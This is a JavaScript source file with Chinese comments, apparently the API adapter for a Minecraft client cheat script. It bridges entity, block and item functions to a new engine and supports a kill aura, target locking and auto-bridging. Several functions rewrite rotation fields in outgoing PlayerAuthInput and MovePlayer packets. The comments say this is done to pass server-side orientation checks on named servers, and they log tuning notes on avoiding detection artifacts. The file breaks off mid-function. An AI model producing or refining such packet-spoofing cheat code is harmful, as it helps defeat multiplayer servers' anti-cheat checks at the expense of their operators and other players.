/* =====================================================================================
 *  TimeUnity —— RunAway v2 API 适配层
 *  ------------------------------------------------------------------------------------
 *  新版跑路引擎已移除 v1 全局 API，本块提供：
 *    1) v2 模块加载（别名统一加 "_" 前缀，避免与脚本内已有变量 gui / input / packet /
 *       item / nbt / player 等冲突）；
 *    2) 对「签名或返回值结构发生变化」「需要实例管理」的 API 提供同名桥接函数，
 *       内部全部由 v2 模块实现，使脚本主体调用形式保持不变。
 *  参考：netease_docs/API 与 netease_docs/API/v2 文档差异。
 * ===================================================================================== */

function _safeRequire() {
    for (let i = 0; i < arguments.length; i++) {
        try {
            const m = require(arguments[i]);
            if (m) return m;
        } catch (e) { }
    }
    return null;
}

const _app = _safeRequire("app");
const _minecraft = _safeRequire("minecraft");
const _player = _safeRequire("player");
const _camera = _safeRequire("camera");
const _world = _safeRequire("world");
const _gui = _safeRequire("gui");
const _input = _safeRequire("input");
/* menu 模块包装：v2 的菜单 JSON 需要显式 hide/can_close 才能正常渲染
   （实测：主菜单补上这两个字段后即可显示）。这里统一为所有菜单补齐，
   并顺便规范化 JSON，避免模板字符串拼接带来的格式差异。 */
const _menuRaw = _safeRequire("menu");
const _menu = {
    load: function (name, json) {
        try {
            let j = json;
            if (typeof j === "string") {
                try {
                    const o = JSON.parse(j);
                    if (o && typeof o === "object" && !Array.isArray(o)) {
                        if (o.hide === undefined) o.hide = true;
                        if (o.can_close === undefined) o.can_close = true;
                        j = JSON.stringify(o);
                    }
                } catch (e) { }
            }
            return _menuRaw.load(name, j);
        } catch (e) { return false; }
    },
    remove: function (name) { try { return _menuRaw.remove(name); } catch (e) { return false; } },
    show: function (name) { try { return _menuRaw.show(name); } catch (e) { return false; } },
    hide: function (name) { try { return _menuRaw.hide(name); } catch (e) { return false; } },
    regFun: function (name) { try { return _menuRaw.regFun(name); } catch (e) { return false; } }
};
const _fs = _safeRequire("fs");
const _https = _safeRequire("https", "network");
const _packet = _safeRequire("packet");
const _options = _safeRequire("options");
const _thread = _safeRequire("thread");
const _vm = _safeRequire("vm");
const _v8 = _safeRequire("v8");
const _crypto = _safeRequire("crypto");
const _i18n = _safeRequire("i18n");
const _media = _safeRequire("media");

/* ---------- 世界 / 维度 / 方块 ---------- */

function _level() {
    try { return _world ? _world.getClientWorld() : null; } catch (e) { return null; }
}

function _localPlayer() {
    try { return _player ? _player.getLocalPlayer() : null; } catch (e) { return null; }
}

function _actor(id) {
    const w = _level();
    if (!w) return null;
    try { const a = w.getEntity(id); if (a) return a; } catch (e) { }
    try { const a = w.getRuntimeEntity(id); if (a) return a; } catch (e) { }
    /* 兜底链：个别服务器（实测布吉岛）上面两条对「非本地玩家」取不到对象，
       而下游 getEntityName / getEntityPos / getEntityRot / getEntityAttribute
       全都要先过这里，取不到就返回空值，目标被筛选条件整批滤掉 ——
       表现为「完全找不到目标」，但玩家列表却照常能显示数量。

       实测数据（布吉岛）：
         · getPlayerList() 能列出玩家（对象形式，带 id / name）
         · getActors() 只有 40 个盔甲架，**一个玩家都没有**
       所以先查 getPlayers()（返回玩家 Actor 数组），再退到 getActors()。 */
    const key = String(id);
    try {
        const ps = w.getPlayers() || [];
        for (let i = 0; i < ps.length; i++) {
            const a = ps[i];
            let uid = "", rid = "";
            try { uid = String(a.getUniqueID()); } catch (e) { }
            try { rid = String(a.getRuntimeID()); } catch (e) { }
            if ((uid && uid === key) || (rid && rid === key)) return a;
        }
    } catch (e) { }
    try {
        const actors = w.getActors() || [];
        for (let i = 0; i < actors.length; i++) {
            const a = actors[i];
            let uid = "", rid = "";
            try { uid = String(a.getUniqueID()); } catch (e) { }
            try { rid = String(a.getRuntimeID()); } catch (e) { }
            if ((uid && uid === key) || (rid && rid === key)) return a;
        }
    } catch (e) { }
    /* 【按名字桥接】布吉岛实测：getPlayerList() 给的 id（如 114536）与 Actor 自己的
       uid（如 685）是**两套编号**，getEntity(114536) 永远 null，uid/rid 也都对不上；
       唯一能可靠对上的是 name。这里用名字把「列表 id」译成「真正的 Actor」。
       只在前面几条都失败时才走，不影响其它服务器的正常路径。 */
    try {
        const list = w.getPlayerList() || {};
        let wantName = null;
        for (const k in list) {
            if (String(list[k].id) === key) { wantName = list[k].name; break; }
        }
        if (wantName) {
            const ps = w.getPlayers() || [];
            for (let i = 0; i < ps.length; i++) {
                let nm = "";
                try { nm = String(ps[i].getName()); } catch (e) { }
                if (nm && nm === String(wantName)) return ps[i];
            }
            const actors2 = w.getActors() || [];
            for (let i = 0; i < actors2.length; i++) {
                let nm = "";
                try { nm = String(actors2[i].getName()); } catch (e) { }
                if (nm && nm === String(wantName)) return actors2[i];
            }
        }
    } catch (e) { }
    return null;
}

function _dimension() {
    /* v2 实测：level.getDimension(0) / getDimension("overworld") 一律抛 "Invalid dimension"
       （在 Rebirth 上做过 A/B/C 三段对照，三个线程位置结果一致，与线程无关）。
       能真正拿到维度对象的是「本地玩家自己的 getDimension()」——
       KuSug 里在跑的 NoteBot3.9.js 正是用它取维度、再 dim.getBlock() 扫方块的。
       这条不修的话，getBlock 会一直兑底返回空气块，搭路/方块识别整条链路都是哑的。 */
    try {
        const p = _localPlayer();
        if (p && typeof p.getDimension === "function") {
            const d = p.getDimension();
            if (d) return d;
        }
    } catch (e) { }
    const w = _level();
    if (!w) return null;
    let id = 0;
    try { const p = _localPlayer(); if (p) id = p.getDimensionId(); } catch (e) { }
    try { return w.getDimension(id); } catch (e) { }
    try { return w.getDimension("overworld"); } catch (e) { }
    return null;
}

/* 批量方块扫描时先取一次维度对象，循环里复用（见 getBlock 的 dim 参数） */
function getScanDimension() {
    try { return _dimension(); } catch (e) { return null; }
}

// v1 Block.namespace 形如 "minecraft:stone"；v2 拿不到单一方块名，这里做多来源兜底
// didHint：已经取过的 descriptionId，传入可省一次跨 JNI 调用
function _blockNamespace(b, didHint) {
    try {
        const ns = b.getNamespace();
        if (ns && ns.indexOf(":") >= 0) return ns;
        let did = didHint;
        if (did === undefined) {
            try { did = b.getDescriptionId(); } catch (e) { did = null; }
        }
        if (did && did.indexOf(":") >= 0) return did;
        return ns || "";
    } catch (e) { return ""; }
}

const _AIR_BLOCK = { id: 0, namespace: "minecraft:air", aux: 0, solid: false, runtimeId: 0, descriptionId: "minecraft:air", descriptionName: "" };

function _blockIsAirName(n) {
    return n === "minecraft:air" || n === "air" || n === "tile.air" || n === "minecraft:air_block";
}

/* dim：批量扫描（自动搭路的立方体探测）时可复用一个维度对象，
   省掉每次 getBlock 内部的 _level/_localPlayer/getDimensionId/getDimension 四次跨 JNI 调用。 */
function getBlock(x, y, z, dim) {
    let d = dim;
    if (!d) d = _dimension();
    if (!d) return _AIR_BLOCK;
    try {
        const b = d.getBlock({ x: x, y: y, z: z });
        let did = null;
        try { did = b.getDescriptionId(); } catch (e) { }
        let ns = _blockNamespace(b, did);
        let itemId = 0, itemIdOk = false;
        /* v1 的 Block.id 是方块物品 ID（空气为 0），脚本用 .id !== 0 判「非空气」；
           v2 的 getRuntimeId() 是运行时 ID，空气也不是 0，必须用 getItemId() 还原语义。 */
        try { itemId = b.getItemId(); itemIdOk = true; } catch (e) { }
        /* 空气归一化：getNamespace() 只给 "minecraft"，拼不出方块名时用 itemId 兜底。
           否则空气会被判成非空，自动搭路既找不到落脚点、也不会放置方块。 */
        if (ns && ns.indexOf(":") >= 0) {
            if (_blockIsAirName(ns)) ns = "minecraft:air";
        } else if (itemIdOk && itemId === 0) {
            ns = "minecraft:air";
        }
        /* 空气快路径：探测范围拉大时 (2R+1)^3 次查询里绝大多数是空气，
           这里只付 2 次调用就返回，跳过其余跨 JNI 取属性。 */
        if (ns === "minecraft:air") return _AIR_BLOCK;
        let aux = 0, rid = 0, solid = false, dname = "";
        try { aux = b.getData(); } catch (e) { }
        try { rid = b.getRuntimeId(); } catch (e) { }
        try { solid = b.isSolid(); } catch (e) { }
        try { dname = b.getDescriptionName(); } catch (e) { }
        return {
            id: itemId,
            namespace: ns,
            aux: aux,
            solid: solid,
            runtimeId: rid,
            descriptionId: did || "",
            descriptionName: dname
        };
    } catch (e) {
        return _AIR_BLOCK;
    }
}

function setBlock(x, y, z, name, state) {
    const d = _dimension();
    if (!d) return false;
    try {
        let blk = null;
        try { blk = new _block.Block(name, state || 0); }
        catch (e) { blk = new _block(name, state || 0); }
        return !!d.setBlock({ x: x, y: y, z: z }, blk);
    } catch (e) { return false; }
}

/* ---------- 实体查询 ---------- */

function getEntityList() {
    const w = _level();
    if (!w) return [];
    try { return w.getActors().map(function (a) { return a.getUniqueID(); }); }
    catch (e) { return []; }
}

function getPlayerList(type) {
    const w = _level();
    if (!w) return [];
    // 取唯一 ID：优先用 level.getPlayerList()（对象形式，与可运行的 玩家传送[坐骑].js 一致）
    if (type !== "RuntimeId") {
        try {
            const list = w.getPlayerList() || {};
            const out = [];
            for (const k in list) {
                const p = list[k];
                if (p && p.id) out.push(p.id);
            }
            if (out.length) return out;
        } catch (e) { }
    }
    try {
        const r = w.getPlayers().map(function (p) {
            return type === "RuntimeId" ? p.getRuntimeID() : p.getUniqueID();
        });
        if (r.length) return r;
    } catch (e) { }
    /* 兜底：个别服务器（实测布吉岛）前两条都返回空，但实体能读到。
       从 getActors() 里按玩家类型 id 筛（319 = minecraft:player，已实测）。
       getActors() 不含本地玩家，而索敌要的正是其他玩家，刚好够用。
       这里保持原有的返回值类型不变，不动其它逻辑。 */
    try {
        const out = [];
        const actors = w.getActors() || [];
        for (let i = 0; i < actors.length; i++) {
            try {
                if (actors[i].getTypeId() === 319) {
                    out.push(type === "RuntimeId" ? actors[i].getRuntimeID() : actors[i].getUniqueID());
                }
            } catch (e) { }
        }
        if (out.length) return out;
    } catch (e) { }
    return [];
}

function getWorldPlayerList() {
    const w = _level();
    if (!w) return [];
    try {
        const list = w.getPlayerList() || {};
        const out = [];
        for (const k in list) {
            const p = list[k];
            if (p && p.id) out.push({ id: p.id, name: p.name || p.id, runtimeId: p.runtimeId });
        }
        if (out.length) return out;
    } catch (e) { }
    try {
        return w.getPlayers().map(function (p) {
            return { id: p.getUniqueID(), name: p.getName(), runtimeId: p.getRuntimeID() };
        });
    } catch (e) { return []; }
}

function getEntityPos(id) {
    const a = _localOrActor(id);
    if (!a) return { x: 0, y: 0, z: 0 };
    try { return a.getPos(); } catch (e) { return { x: 0, y: 0, z: 0 }; }
}

function getEntityPosPrev(id) {
    const a = _localOrActor(id);
    if (!a) return { x: 0, y: 0, z: 0 };
    try { return a.getPosPrev(); } catch (e) { return { x: 0, y: 0, z: 0 }; }
}

function getEntityName(id) {
    const a = _actor(id);
    if (!a) return "";
    try { return a.getName(); } catch (e) { return ""; }
}

function getEntityNamespace(id) {
    const a = _actor(id);
    if (!a) return "";
    try {
        const i = a.getIdentifier();
        if (!i) return "";
        if (typeof i === "string") return i.replace(/<[^>]*>/g, "");
        /* v2 的 getIdentifier() 返回 Identifier 对象，实测（玩家实体）：
             { namespace:"minecraft", identifier:"player",
               fullName:"minecraft:player<>", canonicalName:"minecraft:player" }
           fullName 带 <...> 后缀，而 v1 返回的是不带后缀的 "minecraft:player"。
           下游只要用严格相等判类型就会被坑（NoveXare 的 getTargets 就是
           `if (type === 'minecraft:player') { ... target === self_id ... }`，
           回传带 <> 的值会让这整段被跳过 → 索敌锁到自己）。
           所以优先 canonicalName；拿不到再自己拼；fullName 仅作最后兼底并剥后缀。 */
        if (typeof i.canonicalName === "string" && i.canonicalName.indexOf(":") >= 0) {
            return i.canonicalName.replace(/<[^>]*>/g, "");
        }
        if (typeof i.namespace === "string" && typeof i.identifier === "string" && i.identifier) {
            return i.namespace + ":" + i.identifier;
        }
        const cands = [i.fullName, i.identifier, i.namespace];
        for (let n = 0; n < cands.length; n++) {
            if (typeof cands[n] === "string" && cands[n].indexOf(":") >= 0) {
                return cands[n].replace(/<[^>]*>/g, "");
            }
        }
        return "";
    } catch (e) { return ""; }
}

function getEntityTypeId(id) {
    const a = _actor(id);
    if (!a) return 0;
    try { return a.getTypeId(); } catch (e) { return 0; }
}

function getEntitySize(id) {
    const a = _actor(id);
    if (!a) return { x: 0, y: 0 };
    try { return a.getSize(); } catch (e) { return { x: 0, y: 0 }; }
}

function getEntityRot(id) {
    const a = _localOrActor(id);
    if (!a) return { pitch: 0, yaw: 0 };
    try { return a.getRotation(); } catch (e) { return { pitch: 0, yaw: 0 }; }
}

function getEntityRotPrev(id) {
    const a = _localOrActor(id);
    if (!a) return { pitch: 0, yaw: 0 };
    try { return a.getRotationPrev(); } catch (e) { return { pitch: 0, yaw: 0 }; }
}

function getEntityBodyRot(id) {
    const a = _localOrActor(id);
    if (!a) return 0;
    try { return a.getYBodyRotation(); } catch (e) { return 0; }
}

function getEntityBodyRotPrev(id) {
    const a = _localOrActor(id);
    if (!a) return 0;
    try { return a.getYBodyRotationPrev(); } catch (e) { return 0; }
}

function getEntityMotion(id) {
    const a = _localOrActor(id);
    if (!a) return { x: 0, y: 0, z: 0 };
    try { return a.getMotion(); } catch (e) { return { x: 0, y: 0, z: 0 }; }
}

function getEntityIsGround(id) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { return a.isOnGround(); } catch (e) { return false; }
}

function getEntityFlag(id, flag) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { return a.getStatusFlag(flag); } catch (e) { return false; }
}

function getEntityAttribute(id, name) {
    const a = _actor(id);
    if (!a) return { current: 0, max: 0, min: 0 };
    try { return a.getAttribute(name) || { current: 0, max: 0, min: 0 }; }
    catch (e) { return { current: 0, max: 0, min: 0 }; }
}

/* v1 的物品类 API（getEntityCarriedItem / getPlayerInventoryItem / getPlayerArmorItem /
   getEntityOffhandItem）返回的是「物品 NBT 字符串」，脚本主体大量用 getText()/nbt2object()
   从该字符串里解析 Name / Count / attackDamage / ench 等字段。
   v2 对应方法返回 ItemStack 对象；若直接透传，str.indexOf / str.startsWith 会抛
   TypeError，并被 onTickEvent 的 catch 吞掉，导致杀戮光环之后的所有功能（含自动搭路）
   整体停摆。这里统一转换回 v1 的 NBT 字符串语义。
   空物品返回 ""（v1 亦为字符串），保证 str.includes(...) / getText("") 不会抛异常。 */
/* 脚本里所有按字符串解析物品的地方（getText 取 Name、nbt2object 取 namespace）
   都依赖 NBT 文本里带 Name 字段。v2 的 getNBT() 若不带该字段，方块识别与
   自动搭路的选材就会整条失效，这里用 ItemStack 自身的方法补一个。 */
function _ensureItemName(nbt, item) {
    if (typeof nbt !== "string" || !nbt.length) return nbt;
    if (nbt.indexOf('Name:"') >= 0) return nbt;
    if (nbt.charCodeAt(0) !== 123) return nbt;
    let nm = "";
    try {
        if (typeof item.getBlock === "function") {
            const b = item.getBlock();
            if (b) {
                try { nm = b.getDescriptionId() || ""; } catch (e) { }
                if (!nm || nm.indexOf(":") < 0) {
                    try { nm = b.getNamespace() || ""; } catch (e) { }
                }
            }
        }
    } catch (e) { }
    if (!nm || nm.indexOf(":") < 0) {
        try { nm = item.getName() || ""; } catch (e) { }
    }
    if (!nm) return nbt;
    nm = String(nm).toLowerCase();
    if (nm.indexOf(":") < 0) nm = "minecraft:" + nm;
    return '{Name:"' + nm + '",' + nbt.substring(1);
}

function _itemToV1Nbt(item) {
    if (item === null || item === undefined) return "";
    if (typeof item === "string") return item;
    try {
        if (typeof item.isNull === "function" && item.isNull()) return "";
    } catch (e) { }
    let raw = "";
    try {
        if (typeof item.getNBT === "function") {
            const s = item.getNBT();
            if (typeof s === "string" && s.length) raw = s;
        }
    } catch (e) { }
    if (!raw) {
        try {
            if (typeof item.toString === "function" && item.toString !== Object.prototype.toString) {
                const s = item.toString();
                if (typeof s === "string" && s.length && s.charCodeAt(0) === 123) raw = s;
            }
        } catch (e) { }
    }
    if (!raw) return "";
    return _ensureItemName(raw, item);
}

/* 手持物品必须走本地玩家实体：_actor() 优先返回服务端实体，实测那里的
   getCarriedItem() 拿不到数据（返回空串），会让「手持方块识别」整条失效。 */
function getEntityCarriedItem(id) {
    const a = _localOrActor(id);
    if (!a) return "";
    try { return _itemToV1Nbt(a.getCarriedItem()); } catch (e) { return ""; }
}

function getEntityOffhandItem(id) {
    const a = _localOrActor(id);
    if (!a) return "";
    try { return _itemToV1Nbt(a.getOffhandItem()); } catch (e) { return ""; }
}

function isPlayer(id) {
    const w = _level();
    if (!w) return false;
    try { return !!w.getPlayer(id); } catch (e) { }
    try { return !!w.getRuntimePlayer(id); } catch (e) { }
    return false;
}

function removeEntity(id) {
    const a = _actor(id);
    if (!a) return false;
    try { a.remove(); return true; } catch (e) { return false; }
}

/* ---------- 实体修改 ---------- */

function setEntityPos(id, x, y, z) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { a.setPos({ x: x, y: y, z: z }); return true; } catch (e) { return false; }
}

function setEntityMotion(id, x, y, z) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { a.setMotion({ x: x, y: y, z: z }); return true; } catch (e) { return false; }
}

function setEntityRot(id, pitch, yaw) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { a.setRotation({ pitch: pitch, yaw: yaw }); return true; } catch (e) { return false; }
}

function setEntityRotPrev(id, pitch, yaw) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { a.setRotationPrev({ pitch: pitch, yaw: yaw }); return true; } catch (e) { return false; }
}

function setEntityBodyRot(id, yaw) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { a.setYBodyRotation(yaw); return true; } catch (e) { return false; }
}

function setEntityBodyRotPrev(id, yaw) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { a.setYBodyRotationPrev(yaw); return true; } catch (e) { return false; }
}

/* v1 没有独立的「头部旋转」全局 API；静默旋转需要在不改动实体 rotation /
   bodyRotation（后者决定移动朝向）的前提下转动头部，这里补桥接到 v2 的
   setYHeadRotation / setYHeadRotationPrev（纯视觉头部朝向）。
   注意：本地玩家必须用 player.getLocalPlayer() 的客户端实体；_actor() 会优先
   返回服务端实体，改它的头部朝向在第三人称下看不到任何变化。 */
function _localOrActor(id) {
    try {
        const p = _localPlayer();
        if (p) {
            let pid = null;
            try { pid = p.getUniqueID(); } catch (e) { }
            if (pid !== undefined && pid !== null && String(pid) === String(id)) return p;
        }
    } catch (e) { }
    try {
        if (String(id) === String(self_id)) {
            const p = _localPlayer();
            if (p) return p;
        }
    } catch (e) { }
    return _actor(id);
}

function setEntityHeadRot(id, yaw) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { a.setYHeadRotation(yaw); return true; } catch (e) { return false; }
}

function setEntityHeadRotPrev(id, yaw) {
    const a = _localOrActor(id);
    if (!a) return false;
    try { a.setYHeadRotationPrev(yaw); return true; } catch (e) { return false; }
}

/* 头部朝向的读取桥接（v1 没有对应全局 API；诊断/校验用）。 */
function getEntityHeadRot(id) {
    const a = _localOrActor(id);
    if (!a) return 0;
    try { return a.getYHeadRotation(); } catch (e) { return 0; }
}

function getEntityHeadRotPrev(id) {
    const a = _localOrActor(id);
    if (!a) return 0;
    try { return a.getYHeadRotationPrev(); } catch (e) { return 0; }
}

/* 这一 tick 有没有水平移动输入。
   用途：覆盖 PlayerAuthInput 的 yaw 会被服务端用于「按朝向重算/校验走位」，
   移动中这么改会让位移整个偏到新朝向的坐标系里（走位错乱、与服务端位置分叉）。
   用本地运动向量判断即可，不必依赖包字段布局。 */
function TU_IsStill() {
    try {
        const m = self_motion;
        if (!m) return true;
        return (Math.abs(Number(m.x) || 0) + Math.abs(Number(m.z) || 0)) <= 0.02;
    } catch (e) { return true; }
}

/* —— 覆盖 144 包朝向时，「能不能连身体(pitch/yaw)一起转」的判定 ——
   服务端按「上报朝向 + 本包的移动向量(offset 20/24)」算世界位移：只要包里带着移动
   输入，把 yaw(4) 改成目标方向就等于告诉服务端「我正朝目标走」，它算出的位移方向随之
   改变，本地预测与服务端分叉 —— 表现就是「移动中画面不断回弹，别人看你却完全正常」
   （别人看到的是服务端广播的平滑位置）。
   所以判据必须落在包自己身上，不能落在实际速度上：起步、急转、贴着方块推的时候实际
   速度会瞬时掉到 0 附近，用速度判就会把「正在推摇杆」当成「静止」，于是又去覆盖 yaw
   —— 那正是这一轮回弹的来源。 */
function TU_AllowFullRot(data, forceFull) {
    let moving = true;
    try {
        if (!data || typeof data.byteLength !== "number" || data.byteLength < 32) {
            moving = true;                     // 读不到移动向量：保守起见只转头
        } else {
            const view = (data instanceof ArrayBuffer)
                ? new DataView(data)
                : new DataView(data.buffer, data.byteOffset || 0, data.byteLength);
            const vx = view.getFloat32(20, true);
            const vz = view.getFloat32(24, true);
            moving = !isFinite(vx) || !isFinite(vz) || (Math.abs(vx) + Math.abs(vz)) > 1e-4;
        }
    } catch (e) { moving = true; }
    TU_DiagRot(moving);
    if (moving) {
        /* 移动中默认只覆盖 headYaw(28)：改 yaw 会让服务端按新朝向重算位移，走位被拽。
           但**带朝向校验的服务器是拿这个包的 yaw 判断「你是不是朝着目标」的**，只改头它
           就直接判掉这次攻击 —— 这就是「一部分服务器锁不了敌」的原因（v1api 版三个字段
           无条件全覆盖，所以在哪都能锁）。
             · TU_FullRotInMove  = true → 任何情况整身转，等于 v1api；
             · TU_AttackFullRot  = true → 只在「本 tick 真的出手」时整身转。 */
        const attacking = TU_AttackFullRot
            && (Number(globalThis.TU_AttackTickNo) || -99) >= (Number(globalThis.TU_TickNo) || 0) - 1;
        return TU_FullRotInMove || attacking || (!!forceFull && TU_ThrowFullOnMove);
    }
    return TU_IsStill();                       // 本包没有输入，再确认实际速度也停了
}

/* —— 移动时也要覆盖朝向：MovePlayer(19) ——
   客户端移动时发的是 MovePlayer，静止时才是 PlayerAuthInput（CreeperBox 的 PacketSendEvent
   里两种包的 rotation 都改，这一点由它印证）。只改 144 的话，移动中别人收到的仍是真实朝向：
   表现就是「头部被拉回视角方向」「投掷物飞向实际朝向」。
   MovePlayer 布局：runtimeId(varint) → pos(x,y,z float32) → rot(pitch,yaw,headYaw float32)。
   rot 的起点随 runtimeId 的 varint 长度变化，所以先扫出它的长度再定位。 */
function TU_CoverMovePlayerRot(data, rotData) {
    try {
        const u8 = (data instanceof Uint8Array) ? data
            : (data instanceof ArrayBuffer) ? new Uint8Array(data)
            : new Uint8Array(data.buffer, data.byteOffset || 0, data.byteLength);
        if (u8.length < 32) return data;
        let k = 0;
        let rid = 0n;
        let shift = 0n;
        while (k < u8.length) {
            const b = u8[k++];
            rid |= BigInt(b & 0x7f) << shift;
            shift += 7n;
            if ((b & 0x80) === 0) break;
        }
        const lid = String(LocalRuntimeId || "");
        if (lid !== "" && String(rid) !== lid) return data;      // 别人的移动包不动
        const rotOff = k + 12;
        if (rotOff + 11 >= u8.length) return data;
        const view = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);
        /* 头部朝向（档位 1/2 时不改）—— 移动中发的就是这个包。 */
        if (TU_CoverMode === 0) view.setFloat32(rotOff + 8, rotData.yaw, true);
        /* 身体(pitch/yaw)默认不动：19 包主要在「移动中」发，而移动中改 yaw 会被服务端拿去
           重算位移；起步、贴着方块推时速度会瞬时接近 0，用 TU_IsStill 判「是否静止」并不
           可靠（#23 就是踩在这里），所以这里索性不看速度。静止时的整身转由 144 那条链路做。
           投掷弹道必须精确，forceFull 照转；要移动中整身转就打开 TU_FullRotInMove。 */
        /* 19 包改了朝向却没有补偿（它不含移动输入，TU_FixMove 那套无从下手）。
           第 42 轮把它默认关掉：只改 headYaw，身体朝向留给 144 那条链路（那里有补偿）。
           若某些服务器因此又锁不了敌（#25 加它的初衷），把 TU_Cover19Yaw 打开即可。 */
        const full = rotData.forceFull ? TU_ThrowFullOnMove : (TU_FullRotInMove && TU_Cover19Yaw);
        if (full) {
            view.setFloat32(rotOff, rotData.pitch, true);
            view.setFloat32(rotOff + 4, rotData.yaw, true);
        }
        /* 记录 19 包实际发出的朝向：用来判断服务端更可能吃哪一种。 */
        if (TU_MoveProbe) TU_ProbeAfter19(view, rotOff, full);
        return data;
    } catch (e) { return data; }
}

/* 移动中也整身转（= v1api 的行为）：锁敌最稳，代价是走位被服务端按新朝向重算。
   144 与 19 两条覆盖链路都认它。
   —— 第 40~42 轮实测结论：即使配上 #39 钉死的补偿（数据侧误差 0.0007、位移保持 0.03°），
      实机仍然持续回弹；19 包那条链路经采样确认根本没参与。所以**回退成 false**，
      改用下面 TU_AttackFullRot 的「只在出手瞬间整身转」。 */
const TU_FullRotInMove = false;

/* 出手时「整身转」的幅度上限（度）。#44 引入：
   实测回弹与覆盖**幅度**相关 —— Δ 在 30° 以内时世界速度方向几乎不抖（中位 0.2°），
   超过 30° 就出现剧烈来回（中位 180°）。所以只在「目标方向离自己的真实朝向不太远」
   时才覆盖 yaw；偏得远就只转头部，不去动与位移绑定的那个字段。 */
const TU_SwingMaxDeg = 30;

/* 把角度差归一到 (-180, 180]，幅度判断与补偿共用。 */
function TU_WrapDeg(d) {
    let x = Number(d) || 0;
    x = x % 360;
    if (x > 180) x -= 360;
    if (x <= -180) x += 360;
    return x;
}

/* 19 包（MovePlayer）的朝向覆盖开关。**默认 false**（#42）：
   19 包改了 yaw 却没有补偿 —— 它是「移动中改朝向 → 走位被带偏」唯一一处未被补偿的
   修改，也是 r41 数据之后唯一还没排除的脚本侧变量。关掉后它只改 headYaw，
   身体朝向交给 144 那条有补偿的链路。若某服务器因此锁不了敌，再把它打开。 */
const TU_Cover19Yaw = false;

/* 覆盖档位：0=现状（改 headYaw；pitch/yaw 按既有条件）；1=不改 headYaw；
   2=完全不覆盖朝向（对照用）。用来分辨抽搐/回弹到底跟着哪个字段走。 */
const TU_CoverMode = 0;

/* 只写「上一帧」的朝向（setEntity*RotPrev），不写当前值 —— 这两个 Prev 接口在更新日志里
   被明确描述为「用于旋转插值 / 渲染平滑过渡」，是文档里最接近「只改本地所见」的写法：
   当前值交给引擎驱动，渲染端再往我们给的 Prev 插值。
   默认关；打开后如果第三人称能看到头朝目标且不再抽搐，就说明这条渲染层路径可用。 */
const TU_HeadRotRenderOnly = false;

/* 本地一个朝向字段都不写（含静止时）。**第 46 轮改为 true（默认禁止写入）**。
   本来它是用来消除「第三人称看到自己头部一直抽搐」的（脚本每 tick 写、引擎每帧驱动，
   两边争夺）；第 46 轮用户的对照实验又发现它有一个严重得多的副作用：

     · 只开「发包转头」(setSilentRot，只改包)          → 不回弹
     · 只开「视角转头」(silentRot，会 setEntityRot…)   → 回弹
     · 且开过一次「视角转头」+ 攻击多次后，会进入**持久状态**：
       之后脚本完全不参与、手动边移动边攻击也照样回弹，**重进游戏才恢复**。

   即：写本地实体朝向不仅与引擎争夺，还可能把一种异常状态带给服务端。
   打开这个开关后 silentRot() 在闸门处直接 return —— 不写实体、不脱离相机，
   「视角转头」在效果上等同于「发包转头」，而锁敌的收益（上报朝向）完全保留。
   代价：本机第三人称在静止时看不到自己转头。 */
const TU_LocalRotOff = true;

/* 移动中也写本地实体朝向（第三人称就能看见头在转），代价是与引擎的输入驱动争夺、
   可能出现「目标与真实视角之间抽搐」——#24 把它关掉正是为了消抽搐。默认关。 */
const TU_LocalRotInMove = false;

/* 只在「本 tick 真的出手」时整身转：带朝向校验的服务器看的就是攻击那一下的包。
   —— 第 43 轮打开、第 45 轮**回退成 false**。用户的对照实验：
       杀戮光环 + 一个转头都不开 → 不回弹；开任意一种转头 → 开始回弹。
      即「改包朝向」与「回弹」是直接的因果关系（补偿已证明无法绕过服务端），
      所以出手瞬间的整身转也不再保留。要拿回锁敌就把这一个常量改回 true。 */
const TU_AttackFullRot = false;

/* 移动中投掷也整身转。投掷物的方向是服务端按玩家上报的 yaw 生成的 —— 不覆盖 yaw
   就等于投掷物按真实朝向飞出去（这是「投掷模式失效」的直接原因），所以默认打开。 */
const TU_ThrowFullOnMove = true;

/* 诊断开关（默认关）：想确认「回弹到底来自哪条判据」就把它改成 true —— 每 40 个
   144 包输出一行「包 / 有移动输入 / 速度判误判」。最后一项是旧判据（TU_IsStill）
   把「正在推摇杆」当成「静止」、从而去覆盖 yaw 的次数；它不为 0 才说明老路有洞。 */
const TU_DIAG_ROT = false;

function TU_DiagRot(moving) {
    if (!TU_DIAG_ROT) return;
    try {
        globalThis.TU_DIAG_N = (globalThis.TU_DIAG_N || 0) + 1;
        if (moving) globalThis.TU_DIAG_M = (globalThis.TU_DIAG_M || 0) + 1;
        if (moving && TU_IsStill()) globalThis.TU_DIAG_BAD = (globalThis.TU_DIAG_BAD || 0) + 1;
        if (globalThis.TU_DIAG_N % 40 === 0) {
            _minecraft.clientMessage("§e[TU]包=" + globalThis.TU_DIAG_N + " 有移动输入=" + (globalThis.TU_DIAG_M || 0) + " 速度判误判=" + (globalThis.TU_DIAG_BAD || 0));
        }
    } catch (e) { }
}

/* —— 覆盖 yaw 时同步补偿移动输入（#39；公式由 #38 的实机读数钉死）——
   实测（MoveProbe_r38.txt：3 段视角 × 4 个方向，误差 ≤1.2°）：
       世界位移 w = v24·F + v20·S
       F = (cos(yaw+90), sin(yaw+90))     ← 面向方向
       S = rot(F, -90)                    ← 侧向（v20 为正时朝这一侧）
   写成矩阵即 w = M(yaw)·u（u = (v24, v20)），M = [[cos t, sin t], [sin t, -cos t]]，t = yaw+90。
   M 是对合矩阵（M² = I；数值自检 20 万次采样偏差 1.7e-15），所以把包里的 yaw 从 yaw
   改成 yaw' 时，只要同时把 u 换成 u' = R(Δ)·u（Δ = yaw' - yaw），
   服务端按 M(yaw')·u' 算出的世界位移就与改动前**逐位相同** —— 朝向转过去了，走位不受影响。

   作用范围：只在「这一步真的覆盖了 yaw(4)」且「本包带着移动输入」时才有事可做。
   当前默认下移动中不覆盖 yaw（只覆盖 headYaw），所以它平时不触发；
   打开 TU_FullRotInMove / TU_AttackFullRot（或投掷 forceFull）时它就是保走位的关键。 */
const TU_FixMoveComp = true;

function TU_FixMove(view, dyawDeg) {
    try {
